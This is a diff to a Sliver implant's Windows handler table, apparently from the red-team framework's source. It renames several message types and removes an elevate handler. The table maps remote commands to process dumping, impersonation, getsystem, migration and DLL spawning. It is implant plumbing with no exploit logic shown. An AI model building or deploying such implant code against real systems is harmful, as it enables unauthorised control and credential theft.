@@ -40,26 +40,25 @@ var (
 		sliverpb.MsgProcessDumpReq:     dumpHandler,
 		sliverpb.MsgImpersonateReq:     impersonateHandler,
 		sliverpb.MsgRevToSelf:          revToSelfHandler,
-		sliverpb.MsgRunAs:              runAsHandler,
+		sliverpb.MsgRunAsReq:           runAsHandler,
 		sliverpb.MsgInvokeGetSystemReq: getsystemHandler,
-		sliverpb.MsgElevateReq:         elevateHandler,
 		sliverpb.MsgExecuteAssemblyReq: executeAssemblyHandler,
 		sliverpb.MsgInvokeMigrateReq:   migrateHandler,
 		sliverpb.MsgSpawnDllReq:        spawnDllHandler,
 
 		// Generic
-		sliverpb.MsgPsReq:       psHandler,
-		sliverpb.MsgTerminate:   terminateHandler,
-		sliverpb.MsgPing:        pingHandler,
-		sliverpb.MsgLsReq:       dirListHandler,
-		sliverpb.MsgDownloadReq: downloadHandler,
-		sliverpb.MsgUploadReq:   uploadHandler,
-		sliverpb.MsgCdReq:       cdHandler,
-		sliverpb.MsgPwdReq:      pwdHandler,
-		sliverpb.MsgRmReq:       rmHandler,
-		sliverpb.MsgMkdirReq:    mkdirHandler,
-		sliverpb.MsgIfconfigReq: ifconfigHandler,
-		sliverpb.MsgExecuteReq:  executeHandler,
+		sliverpb.MsgPsReq:        psHandler,
+		sliverpb.MsgTerminateReq: terminateHandler,
+		sliverpb.MsgPing:         pingHandler,
+		sliverpb.MsgLsReq:        dirListHandler,
+		sliverpb.MsgDownloadReq:  downloadHandler,
+		sliverpb.MsgUploadReq:    uploadHandler,
+		sliverpb.MsgCdReq:        cdHandler,
+		sliverpb.MsgPwdReq:       pwdHandler,
+		sliverpb.MsgRmReq:        rmHandler,
+		sliverpb.MsgMkdirReq:     mkdirHandler,
+		sliverpb.MsgIfconfigReq:  ifconfigHandler,
+		sliverpb.MsgExecuteReq:   executeHandler,
 
 		sliverpb.MsgScreenshotReq: screenshotHandler,
 
@@ -144,30 +143,9 @@ func getsystemHandler(data []byte, resp RPCResponse) {
 	err = priv.GetSystem(getSysReq.Data, getSysReq.HostingProcess)
 	getSys := &sliverpb.GetSystem{}
 	if err != nil {
-		getSys.Output = err.Error() // TODO: Probably don't need to send this twice
 		getSys.Response = &commonpb.Response{Err: err.Error()}
 	}
 	data, err = proto.Marshal(getSys)
-	resp(data, err)
-}
-
-func elevateHandler(data []byte, resp RPCResponse) {
-	elevateReq := &sliverpb.ElevateReq{}
-	err := proto.Unmarshal(data, elevateReq)
-	if err != nil {
-		// {{if .Debug}}
-		log.Printf("error decoding message: %v", err)
-		// {{end}}
-		return
-	}
-	err = priv.Elevate()
-	elevate := &sliverpb.Elevate{
-		Success: err == nil,
-	}
-	if err != nil {
-		elevate.Response = &commonpb.Response{Err: err.Error()}
-	}
-	data, err = proto.Marshal(elevate)
 	resp(data, err)
 }
 
